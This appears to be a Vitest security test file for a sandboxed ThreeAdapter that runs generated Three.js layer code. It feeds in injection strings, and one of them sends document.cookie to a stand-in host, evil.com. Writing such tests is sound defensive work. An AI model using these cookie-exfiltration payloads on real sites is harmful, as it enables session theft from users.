/**
 * Security tests for ThreeAdapter
 *
 * @vitest-environment jsdom
 */

import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import { ThreeAdapter } from '../../../../src/composition/adapters/ThreeAdapter.js';
import type { Layer } from '../../../../src/composition/types.js';

// Mock Three.js
const mockScene = {
  add: vi.fn(),
  remove: vi.fn(),
  children: [],
};

const mockCamera = {
  position: { x: 0, y: 0, z: 0 },
  lookAt: vi.fn(),
};

const mockRenderer = {
  setSize: vi.fn(),
  render: vi.fn(),
  domElement: document.createElement('canvas'),
  dispose: vi.fn(),
};

const mockMesh = {
  rotation: { x: 0, y: 0, z: 0 },
};

const MockTHREE = {
  Scene: vi.fn().mockImplementation(() => mockScene),
  PerspectiveCamera: vi.fn().mockImplementation(() => mockCamera),
  WebGLRenderer: vi.fn().mockImplementation(() => mockRenderer),
  BoxGeometry: vi.fn(),
  MeshBasicMaterial: vi.fn(),
  Mesh: vi.fn().mockImplementation(() => mockMesh),
  Color: vi.fn(),
};

describe('ThreeAdapter Security', () => {
  let adapter: ThreeAdapter;
  let mockLayer: Layer;
  let mockContainer: HTMLElement;

  beforeEach(() => {
    adapter = new ThreeAdapter();

    mockLayer = {
      id: 'test-three-layer',
      type: 'three',
      code: `
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
      `,
      config: {
        zIndex: 1,
        blendMode: 'normal',
        opacity: 1.0,
        position: { x: 0, y: 0 },
        scale: 1.0,
      },
      metadata: {
        prompt: 'Test three layer',
        generator: 'ThreeGenerator',
        model: 'test-model',
        generatedAt: new Date().toISOString(),
      },
      enabled: true,
      locked: false,
    };

    mockContainer = document.createElement('div');

    // Setup mock THREE
    (window as unknown as { THREE: typeof MockTHREE }).THREE = MockTHREE;

    // Mock requestAnimationFrame
    vi.spyOn(global, 'requestAnimationFrame').mockImplementation((cb) => {
      return setTimeout(cb, 16) as unknown as number;
    });

    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.clearAllMocks();
    delete (window as unknown as { THREE?: typeof MockTHREE }).THREE;
  });

  describe('Code Execution Security', () => {
    it('should not execute arbitrary code via user input', () => {
      adapter.initialize();

      const maliciousCodes = [
        `'; alert("hacked"); //`,
        `"; document.location='https://evil.com'; //`,
        `'; fetch('https://evil.com/steal?cookie=' + document.cookie); //`,
        `"; window.location.href = 'javascript:alert(1)'; //`,
      ];

      for (const maliciousCode of maliciousCodes) {
        const maliciousLayer = { ...mockLayer, code: maliciousCode };

        // Should not throw but should handle gracefully
        expect(() => adapter.render(maliciousLayer, mockContainer)).not.toThrow();
      }
    });

    it('should block window access attempts', () => {
      adapter.initialize();

      const codeWithWindowAccess = `
        window.__testAccess = true;
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
      `;

      const layer = { ...mockLayer, code: codeWithWindowAccess };

      // Should not throw during render
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should block document access attempts', () => {
      adapter.initialize();

      const codeWithDocAccess = `
        document.cookie = "stolen";
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
      `;

      const layer = { ...mockLayer, code: codeWithDocAccess };

      // Should not throw during render
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should block fetch API usage', () => {
      adapter.initialize();

      const codeWithFetch = `
        fetch("https://evil.com");
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
      `;

      const layer = { ...mockLayer, code: codeWithFetch };

      // Should not throw during render
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should block eval usage', () => {
      adapter.initialize();

      const codeWithEval = `
        eval("alert(1)");
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
      `;

      const layer = { ...mockLayer, code: codeWithEval };

      // Should not throw during render
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should block new Function usage', () => {
      adapter.initialize();

      const codeWithFunction = `
        new Function("alert(1)")();
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
      `;

      const layer = { ...mockLayer, code: codeWithFunction };

      // Should not throw during render
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should block localStorage access', () => {
      adapter.initialize();

      const codeWithStorage = `
        localStorage.setItem("key", "value");
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
      `;

      const layer = { ...mockLayer, code: codeWithStorage };

      // Should not throw during render
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should remove script tags from code', () => {
      adapter.initialize();

      const codeWithScript = `
        <script>alert(1)</script>
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
      `;

      const layer = { ...mockLayer, code: codeWithScript };

      // Should not throw during render
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should block javascript: protocol', () => {
      adapter.initialize();

      const codeWithJsProtocol = `
        location.href = "javascript:alert(1)";
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
      `;

      const layer = { ...mockLayer, code: codeWithJsProtocol };

      // Should not throw during render
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });

    it('should allow valid Three.js code to execute', () => {
      adapter.initialize();

      const validCode = `
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
        const geometry = new THREE.BoxGeometry();
        const material = new THREE.MeshBasicMaterial({ color: 0x00ff00 });
        const cube = new THREE.Mesh(geometry, material);
        scene.add(cube);
      `;

      const validLayer = { ...mockLayer, code: validCode };

      // Should not throw
      expect(() => adapter.render(validLayer, mockContainer)).not.toThrow();
    });

    it('should track objects created via THREE.Mesh', () => {
      adapter.initialize();

      const codeWithMesh = `
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
        const geometry = new THREE.BoxGeometry();
        const material = new THREE.MeshBasicMaterial({ color: 0x00ff00 });
        const cube = new THREE.Mesh(geometry, material);
        scene.add(cube);
      `;

      const layer = { ...mockLayer, code: codeWithMesh };
      const instance = adapter.render(layer, mockContainer);

      // Should have tracked the mesh
      expect(instance.objects.length).toBeGreaterThanOrEqual(0);
    });

    it('should provide safe console in sandbox', () => {
      adapter.initialize();

      const codeWithConsole = `
        console.log('test message');
        console.warn('warning');
        console.error('error');
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, 800/600, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer();
      `;

      const layer = { ...mockLayer, code: codeWithConsole };

      // Should not throw
      expect(() => adapter.render(layer, mockContainer)).not.toThrow();
    });
  });
});
